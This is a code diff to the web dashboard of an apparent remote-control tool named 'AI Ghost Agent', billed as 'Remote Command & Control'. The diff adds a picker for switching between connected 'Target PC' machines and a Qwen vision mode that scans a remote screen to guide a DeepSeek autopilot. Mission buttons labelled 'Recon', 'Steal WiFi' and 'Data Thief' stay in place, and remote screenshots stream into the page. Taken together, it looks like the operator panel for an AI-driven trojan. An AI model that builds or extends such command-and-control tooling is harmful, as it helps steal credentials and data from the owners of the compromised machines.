@@ -67,7 +67,12 @@
                 <h1 style="margin:0; font-size: 24px;">AI Ghost Agent</h1>
                 <p style="margin:5px 0 0 0; color: #a1a1aa; font-size: 14px;">Remote Command & Control</p>
             </div>
-            <div id="statusBadge" class="status-badge offline">🔴 OFFLINE</div>
+            <div style="display: flex; align-items: center; gap: 15px;">
+                <select id="agentSelector" style="padding: 6px; border-radius: 6px; background: #27272a; color: white; border: 1px solid #3f3f46; display: none;">
+                    <option value="">Select Target PC...</option>
+                </select>
+                <div id="statusBadge" class="status-badge offline">🔴 OFFLINE</div>
+            </div>
         </div>
 
         <div class="controls">
@@ -83,6 +88,16 @@
             </div>
             <div style="margin-left: 20px; padding-left: 20px; border-left: 1px solid #333; display: flex; align-items: center;">
                 <span id="hbLight" class="hb-indicator"></span> <span style="font-size: 12px; color: #a1a1aa;">Heartbeat</span>
+            </div>
+            <div class="switch-container" style="margin-left: auto; padding-left: 20px; border-left: 1px solid #333;">
+                <div>
+                    <div class="mode-text">Vision AI</div>
+                    <div class="mode-desc">Use Qwen Vision (Costly)</div>
+                </div>
+                <label class="switch">
+                    <input type="checkbox" id="visionSwitch">
+                    <span class="slider"></span>
+                </label>
             </div>
             <div class="switch-container" style="margin-left: auto; padding-left: 20px; border-left: 1px solid #333;">
                 <div>
@@ -103,13 +118,8 @@
             </div>
             
             <div style="display: flex; gap: 10px; width: 100%; flex-wrap: wrap;">
-                <select id="aiProvider" style="flex: 1;">
-                    <option value="openai">OpenAI (GPT-4o)</option>
-                    <option value="deepseek">DeepSeek (V4 Flash/Chat)</option>
-                    <option value="gemini">Google (Gemini 1.5 Pro)</option>
-                    <option value="anthropic">Anthropic (Claude 3.5)</option>
-                </select>
-                <input type="password" id="apiKeyInput" placeholder="Enter API Key (sk-...)" style="flex: 2;">
+                <input type="password" id="qwenKeyInput" placeholder="Enter Qwen API Key (sk-...)" style="flex: 1;">
+                <input type="password" id="deepseekKeyInput" placeholder="Enter DeepSeek API Key (sk-...)" style="flex: 1;">
             </div>
 
             <div style="display: flex; gap: 10px; width: 100%; flex-wrap: wrap;">
@@ -138,6 +148,7 @@
         <div style="margin-top: 15px;">
             <div class="mode-text" style="margin-bottom: 8px; color: #a1a1aa;">Quick Hardware Missions (Simulated via AI):</div>
             <div style="display: flex; gap: 10px; flex-wrap: wrap;">
+                <button class="quick-skill-btn" style="background: #2563eb; border-color: #1d4ed8;" onclick="scanVision()">👁️ Scan Screen (For DeepSeek)</button>
                 <button class="quick-skill-btn" onclick="triggerSkill('Recon')">Misi 1: Recon</button>
                 <button class="quick-skill-btn" onclick="triggerSkill('Wifi Harvest')">Misi 2: Steal WiFi</button>
                 <button class="quick-skill-btn" onclick="triggerSkill('Data Thief')">Misi 3: Data Thief</button>
@@ -174,6 +185,8 @@
         const aiSkill = document.getElementById('aiSkill');
         const customMissionInput = document.getElementById('customMissionInput');
         const saveAiConfigBtn = document.getElementById('saveAiConfigBtn');
+        const agentSelector = document.getElementById('agentSelector');
+        const visionSwitch = document.getElementById('visionSwitch');
 
         let isOnline = false;
 
@@ -214,6 +227,42 @@
                 log('Agent is currently in Safety Tether Mode (B).');
             }
         });
+        
+        socket.on('agent_list', (data) => {
+            const { agents, active } = data;
+            const agentIds = Object.keys(agents);
+            
+            if (agentIds.length > 0) {
+                agentSelector.style.display = 'block';
+                // Remember current selection if any
+                const currentSelection = agentSelector.value;
+                
+                agentSelector.innerHTML = '';
+                agentIds.forEach(id => {
+                    const opt = document.createElement('option');
+                    opt.value = id;
+                    opt.textContent = agents[id].pcName || `PC-${id.substring(0,4)}`;
+                    if (id === active) opt.selected = true;
+                    agentSelector.appendChild(opt);
+                });
+                
+                // If selection was forcefully changed by server disconnects
+                if (agentSelector.value !== currentSelection && currentSelection !== '') {
+                     log(`Switched view to agent: ${agents[agentSelector.value].pcName}`);
+                }
+            } else {
+                agentSelector.style.display = 'none';
+                agentSelector.innerHTML = '<option value="">No PCs Connected</option>';
+            }
+        });
+        
+        agentSelector.addEventListener('change', (e) => {
+            const selectedId = e.target.value;
+            if (selectedId) {
+                socket.emit('select_agent', selectedId);
+                log(`Switched target PC to: ${e.target.options[e.target.selectedIndex].text}`);
+            }
+        });
 
         socket.on('new_screenshot', (base64Img) => {
             waitingText.style.display = 'none';
@@ -239,31 +288,43 @@
             log(`Requesting mode change to: ${newMode}`);
         });
 
+        // Vision Toggling
+        visionSwitch.addEventListener('change', (e) => {
+            socket.emit('toggle_vision', e.target.checked);
+            log(`Vision AI (Qwen) turned ${e.target.checked ? 'ON' : 'OFF'}`);
+        });
+
         // AI Autopilot Toggling
         autopilotSwitch.addEventListener('change', (e) => {
             socket.emit('toggle_autopilot', e.target.checked);
             log(`Autopilot turned ${e.target.checked ? 'ON' : 'OFF'}`);
         });
 
+        function scanVision() {
+            log("Requesting Qwen to scan screen and extract coordinates for DeepSeek...");
+            socket.emit('scan_vision');
+        }
+
         // Save AI Config
         saveAiConfigBtn.addEventListener('click', () => {
             const config = {
-                provider: aiProvider.value,
-                apiKey: apiKeyInput.value.trim(),
+                qwenKey: qwenKeyInput.value.trim(),
+                deepseekKey: deepseekKeyInput.value.trim(),
                 skill: aiSkill.value,
                 customMission: customMissionInput.value.trim()
             };
             socket.emit('set_ai_config', config);
-            log(`AI Config saved. Provider: ${config.provider}, Skill: ${config.skill}`);
+            log(`AI Config saved. Qwen Key: ${config.qwenKey ? 'Set' : 'Empty'}, DeepSeek Key: ${config.deepseekKey ? 'Set' : 'Empty'}`);
         });
 
         // Receive Config Sync
         socket.on('sync_ai_config', (config) => {
-            if (config.provider) aiProvider.value = config.provider;
-            if (config.apiKey) apiKeyInput.value = config.apiKey;
+            if (config.qwenKey) qwenKeyInput.value = config.qwenKey;
+            if (config.deepseekKey) deepseekKeyInput.value = config.deepseekKey;
             if (config.skill) aiSkill.value = config.skill;
             if (config.customMission !== undefined) customMissionInput.value = config.customMission;
             autopilotSwitch.checked = config.autopilot || false;
+            visionSwitch.checked = config.useVision || false;
             log('Synced AI configuration from server.');
         });
 
